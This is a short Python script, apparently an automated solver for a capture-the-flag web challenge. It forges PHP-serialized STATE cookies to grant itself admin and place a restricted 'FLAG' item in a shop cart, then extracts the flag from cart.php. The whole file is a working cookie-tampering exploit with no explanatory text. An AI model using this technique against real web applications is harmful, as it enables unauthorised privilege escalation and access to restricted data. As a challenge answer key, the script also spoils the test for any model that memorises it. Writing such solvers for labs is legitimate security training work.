#!/usr/bin/env python3
import requests
import re
import sys

def main(ip, output_file):
    requests.packages.urllib3.disable_warnings()

    base_url = f"http://{ip}:8005"

    cookies_step1 = {
        'STATE': 'a%3A1%3A%7Bs%3A5%3A%22admin%22%3Bs%3A1%3A%221%22%3B%7D'
    }

    headers_step1 = {
        'Content-type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
        'Referer': f'{base_url}/browse.php',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    }

    url_actions = f'{base_url}/actions.php'
    data = {'add_item': '6'}

    requests.post(url_actions, headers=headers_step1, cookies=cookies_step1, data=data, verify=False, timeout=30)

    cookies_step2 = {
        'STATE': 'a%3A2%3A%7Bs%3A5%3A%22admin%22%3Bs%3A1%3A%221%22%3Bs%3A4%3A%22cart%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A4%3A%7Bs%3A4%3A%22name%22%3Bs%3A4%3A%22FLAG%22%3Bs%3A5%3A%22price%22%3Bd%3A9999999.99%3Bs%3A10%3A%22restricted%22%3Bb%3A1%3Bs%3A4%3A%22desc%22%3Bs%3A64%3A%22This%20is%20the%20flag.%20If%20you%20put%20this%20in%20your%20cart%2C%20you%20can%20view%20it%21%22%3B%7D%7D%7D'
    }

    headers_step2 = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,el;q=0.8',
        'Referer': f'{base_url}/browse.php',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'Upgrade-Insecure-Requests': '1'
    }

    url_cart = f'{base_url}/cart.php'

    response2 = requests.get(url_cart, headers=headers_step2, cookies=cookies_step2, verify=False, timeout=30)
    content = response2.text

    match = re.search(r'FLAG - ([a-f0-9]{40,})', content)
    if match:
        flag = match.group(1)
        with open(output_file, 'w') as f:
            f.write(flag + '\n')
        print(f"Flag saved to {output_file}")
    else:
        print("Flag not found")

if __name__ == "__main__":
    ip = sys.argv[2]
    output_file = sys.argv[4]
    print(ip, output_file)
    main(ip, output_file)

